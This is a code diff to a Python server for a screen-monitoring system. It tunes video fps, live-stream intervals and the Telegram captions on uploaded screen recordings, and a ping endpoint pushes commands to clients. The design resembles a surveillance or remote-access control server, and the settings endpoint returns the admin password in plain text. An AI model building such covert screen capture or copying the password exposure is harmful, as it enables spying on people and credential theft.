@@ -348,11 +348,11 @@ def get_settings(session: str = Depends(verify_session)):
             pass
     return {
         "retention_hours": cfg.get("retention_hours", 24),
-        "video_fps": cfg.get("video_fps", 10),
+        "video_fps": cfg.get("video_fps", 5),
         "video_chunk_minutes": cfg.get("video_chunk_minutes", 2),
         "send_videos_to_telegram": cfg.get("send_videos_to_telegram", True),
         "video_recording_enabled": cfg.get("video_recording_enabled", True),
-        "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 5),
+        "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 4),
         "screenshot_interval_seconds": cfg.get("screenshot_interval_seconds", 300),
         "admin_password": ADMIN_PASSWORD
     }
@@ -709,13 +709,14 @@ async def client_upload_video(
     if content:
         import html
         from datetime import datetime
-        file_size_mb = round(len(content) / (1024 * 1024), 2)
+        fsize = len(content)
+        size_str = f"{round(fsize / 1024, 1)} KB" if fsize < 1024 * 1024 else f"{round(fsize / (1024 * 1024), 2)} MB"
         now_str = datetime.now().strftime("%I:%M %p")
         caption = (
             f"📹 <b>[{html.escape(clean.upper())}] Screen Video Recording</b>\n"
             f"🕒 Time: {now_str}\n"
             f"📁 File: <code>{html.escape(video.filename)}</code>\n"
-            f"📦 Size: {file_size_mb} MB"
+            f"📦 Size: <b>{size_str}</b> (Ultra-light 24h CCTV)"
         )
         try:
             send_telegram_video(content, video.filename, caption)
@@ -760,10 +761,10 @@ def client_ping(payload: dict, x_api_secret: Optional[str] = Header(None)):
         "status": "pong",
         "command": cmd,
         "config": {
-            "video_fps": cfg.get("video_fps", 10),
+            "video_fps": cfg.get("video_fps", 5),
             "video_chunk_minutes": cfg.get("video_chunk_minutes", 2),
             "video_recording_enabled": cfg.get("video_recording_enabled", True),
-            "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 5),
+            "live_stream_interval_seconds": cfg.get("live_stream_interval_seconds", 4),
             "screenshot_interval_seconds": cfg.get("screenshot_interval_seconds", 300)
         }
     }
